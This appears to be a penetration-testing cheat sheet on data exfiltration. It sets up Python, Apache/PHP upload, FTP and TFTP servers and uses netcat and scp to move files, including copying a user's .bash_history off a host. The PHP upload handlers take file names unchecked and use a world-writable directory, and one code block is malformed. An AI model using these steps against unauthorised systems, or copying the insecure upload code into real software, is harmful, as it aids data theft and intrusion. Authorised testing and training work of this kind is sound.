# Data exfiltration

* Rule of thumb: Use native tool first
* Pyhton3 Web Server
* Apache Web Server
* Pure FTPd
* aTFTPd

## Run and download from a Python3 Web Server

* serve current working directory
* retrieve data with different clients

```bash
python3 -m http.server 8080
wget http://serverip:8080/filename -O output
curl http://serverip:8080/filename -o output
```

## Install and configure Apache Web server

* Apache2 is insalled on kali
* config file /etc/apache2/apache2.conf
* default www root /var/www/html/

```bash
sudo apt update && sudo apt install apache2

cat /etc/apache2/apache2.conf
sudo systemctl start apache2

cp file /var/www/html/
ls -al /var/www/html/
```

### Prepare HTML file upload form using PHP

* cp html and php file /var/www/html/
* make upload directory /var/www/html/upload/
* finally restart the apache2 web server to serve the upload
* increase the file upload size sudo vi /etc/php/<version>/apache2/php.ini 
* e.g. **upload_max_filesize = 512M**

```bash
cat << EOF > /var/www/html/upload.html
<html>
<head></head>
<body>
<h4> File uploads </h4>
<form enctype="multipart/form-data" action="upload.php" method="post">
<p>
Select File:
<input type="file" name="uploadedfile" />
<input type="submit" name="Upload" value="Upload" />
</p>
</form>
</body>
</html>
EOF
```

```bash
cat upload.php
<?php 
$uploaddir = "/var/www/html/uploads/";
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
EOF

### Upload PHP with Error handling

```bash
cat << EOF > /var/www/html/upload.php
<?php 
$target_path = "uploads/"; 
$target_path = $target_path . basename($_FILES['uploadedfile']['name']); 

echo "Source=" . $_FILES['uploadedfile']['name'] . "<br />"; 
echo "Target path=" . $target_path . "<br />"; 
echo "Size=" . $_FILES['uploadedfile']['size'] . "<br />"; 

if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
echo "The file " . basename( $_FILES['uploadedfile']['name']) . " has been uploaded"; 
} else { 
echo "There was an error uploading the file, please try again!"; 
} 
?>
EOF
```

```bash
mkdir /var/www/html/uploads/
chmod 777 .
```

Execute HTML file upload using curl or wget

```bash
curl --form "uploadedfile=@/path/to/file" http://server-ip/upload.php
```

```bash
wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" \
--post-file postfile http://server-ip/upload.php

cat <<EOF > postfile
--FILEUPLOAD
Content-Disposition: form-data; name="comment"

I love uploading files!

--FILEUPLOAD
Content-Disposition: form-data; name="uploadFile"; filename="myfile.bin"; 
Content-Type: application/octet-stream
Media Type: application/octet-stream

This is the file upload content. 
It's possible without B64 encoding, if the boundary is not part of file.

--FILEUPLOAD--
EOF
```

## Install and configure Pure FTP

* add virtual ftpuser to offsec login user
* create a password for offsec login user
* make /ftphome writeable for pure-ftpd

```bash
sudo apt update && sudo apt install pure-ftpd

cat <<EOF > ./setup-ftp.sh
#!/bin/bash
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
EOF

chmod +x setup-ftp.sh
sudo ./setup-ftp.sh
systemctl status pure-ftpd
```

## Install and confiugre TFTP

* create /tftp folder
* change owner of /tftp
* start deamon on udp port 69

```bash
sudo apt update && sudo apt install atftpd

cat <<EOF > setup-atftpd.sh
#!/bin/bash

sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
EOF
```

## Connect FTP

Anoymous connect

```bash
ftp host-IP
Name: anonymous
<Enter>

ftp> ls
ftp> get somefile.txt
ftp> put somefile.bin
ftp> quit

# disable passive mode
ftp> passive
# binary file transfer
ftp> binary
# text file only transfer (use with caution)
ftp> ascii

```

## Connect to TFTP

```bash
tftp host-IP
# ls option is by default deactivated
tftp> get somefile.txt
tftp> put somefile.txt
```


## Netcat

```bash
nc -lvnp 1234 > receive.txt
nc -vn host-IP 1234 < send.txt
```

## SCP

```bash
scp user@IP:/home/user/.bash_history history.txt
```
